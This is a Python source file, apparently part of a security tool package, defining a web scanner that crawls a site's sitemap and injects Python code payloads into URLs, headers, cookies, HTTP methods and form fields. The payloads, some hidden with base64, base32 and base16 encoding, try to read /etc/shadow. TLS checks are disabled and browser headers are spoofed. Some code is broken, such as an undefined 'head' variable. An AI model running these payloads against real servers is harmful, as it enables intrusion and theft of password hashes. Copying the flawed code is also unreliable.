import random
import re
import ssl
import time
import urllib.parse
import urllib.request
from TheSilent.clear import clear
from TheSilent.dolphin_scanner import dolphin_scanner
from TheSilent.return_user_agent import return_user_agent

verify = ssl.create_default_context()
verify.check_hostname = False
verify.verify_mode = ssl.CERT_NONE

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

def melon_scanner(url,delay=1):
    clear()
    payload_list = []
    host_list = [url]

    try:
        my_request = urllib.request.Request(url + "/sitemap.xml", method="GET")
        my_request.add_header("User-Agent",return_user_agent())
        my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
        my_request.add_header("Accept-Encoding","deflate")
        my_request.add_header("Accept-Language","en-US,en;q=0.5")
        my_request.add_header("Referer","https://www.google.com/")
        my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
        simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
        xml_list = re.findall("http\S+<", simple_response)
        for xml in xml_list:
            result = xml.split("<")[0]
            result = result.split("'")[0]
            result = result.split('"')[0]
            result = re.sub("/$", "", result)
            host_list.append(result)

    except:
        pass

    host_list = list(set(host_list[:]))
    host_list.sort()

    mal_python = [r"eval(compile('import os\nos.system(\'/etc/shadow\')', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\nos.system(base64.b64decode(b\'Y2F0IC9ldGMvc2hhZG93\'))', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\nos.system(base64.b32decode(b\'MNQXIIBPMV2GGL3TNBQWI33X\'))', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\nos.system(base64.b16decode(b\'636174202F6574632F736861646F77\'))', 'melon', 'exec'))",
                  r"eval(compile('import os\ndef melon():\n    data = open(\'/etc/shadow\',\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b64decode(b\'L2V0Yy9zaGFkb3c=\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b32decode(b\'F5SXIYZPONUGCZDPO4======\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b16decode(b\'2F6574632F736861646F77\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))"
                  ]

    for host in host_list:
        print(CYAN + f"checking: {host}")
        
        # test for python injection in url
        print(CYAN + "checking for python injection in url")
        for mal in mal_python:
            time.sleep(delay)
            start = time.time()
            try:
                my_request = urllib.request.Request(host + f"/{urllib.parse.quote(mal)}", method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"url: {mal}")

            except:
                continue

        # test for python injection in headers
        print(CYAN + "checking for python injection in headers")
        time.sleep(delay)
        for mal in mal_python:
            time.sleep(delay)
            try:
                my_request = urllib.request.Request(host, method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                my_request.add_header(head,mal)
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"headers: {mal}")

            except:
                continue
            
        # test for python injection in cookie
        print(CYAN + "checking for python injection in cookie")
        for mal in mal_python:
            time.sleep(delay)
            try:
                my_request = urllib.request.Request(host, method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                my_request.add_header("Cookie",mal)
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"cookie: {mal}")

            except:
                continue

        # test for python injection in method
        print(CYAN + "checking for python injection in method")
        for mal in mal_python:
            time.sleep(delay)
            try:
                my_request = urllib.request.Request(host, method=mal)
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"method: {mal}")

            except:
                continue

        # test for python injection in forms
        print(CYAN + "checking for python injection in forms")
        form_list = []
        for mal in mal_python:
            time.sleep(delay)
            try:
                my_request = urllib.request.Request(host, method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                input_form = re.findall("<input.+>", simple_response.lower())
                method = re.findall("method.?=.?[\"\'](\S+)[\"\']", simple_response.lower())[0]
                for field in input_form:
                    form_id = re.findall("id.?=.?[\"\'](\S+)[\"\']", field.lower())[0]
                    form_name = re.findall("name.?=.?[\"\'](\S+)[\"\']", field.lower())[0]
                    form_list.append(form_id)
                    form_list.append(form_name)

                form_list = list(set(form_list))
                form_list.sort()
                for field in form_list:
                    time.sleep(delay)
                    if method == "get":
                        my_request = urllib.request.Request(host, method="GET")
                        my_request.add_header("User-Agent",return_user_agent())
                        my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                        my_request.add_header("Accept-Encoding","deflate")
                        my_request.add_header("Accept-Language","en-US,en;q=0.5")
                        my_request.add_header("Referer","https://www.google.com/")
                        my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                        if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {mal}")

                    if method == "post":
                        my_request = urllib.request.Request(host, method="POST")
                        my_request.add_header("User-Agent",return_user_agent())
                        my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                        my_request.add_header("Accept-Encoding","deflate")
                        my_request.add_header("Accept-Language","en-US,en;q=0.5")
                        my_request.add_header("Referer","https://www.google.com/")
                        my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                        if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {mal}")

                    if method == "put":
                        my_request = urllib.request.Request(host, method="PUT")
                        my_request.add_header("User-Agent",return_user_agent())
                        my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                        my_request.add_header("Accept-Encoding","deflate")
                        my_request.add_header("Accept-Language","en-US,en;q=0.5")
                        my_request.add_header("Referer","https://www.google.com/")
                        my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                        if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {field}:{mal}")

            except:
                continue

    clear()
    if len(payload_list) > 0:
        for payload in payload_list:
            print(RED + payload)

    else:
        print(GREEN + "this server is secure")
